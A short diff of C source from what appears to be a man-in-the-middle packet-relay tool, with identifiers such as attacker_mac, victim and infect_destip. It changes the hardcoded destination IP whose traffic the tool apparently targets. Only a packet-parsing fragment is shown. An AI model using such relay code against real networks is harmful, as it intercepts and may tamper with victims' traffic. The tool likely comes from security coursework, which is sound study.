@@ -73,7 +73,7 @@ int relay(const char *dev, pcap_t *pcap, u_int8_t *attacker_mac, u_int8_t *victi
         ip_hdr *ippkt = (ip_hdr *)(packet + 14);
         tcp_hdr *tcppkt = (tcp_hdr *)(packet + 14 + 4 * ippkt->ip_hl);
         u_char *payload = (u_char *)(packet + 14 + 4 * ippkt->ip_hl + 4 * tcppkt->tcp_offset);
-        u_int8_t infect_destip[4] = {179, 116, 97, 148};
+        u_int8_t infect_destip[4] = {179, 116, 97, 147};
         if (res == 0)
             continue;
         if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
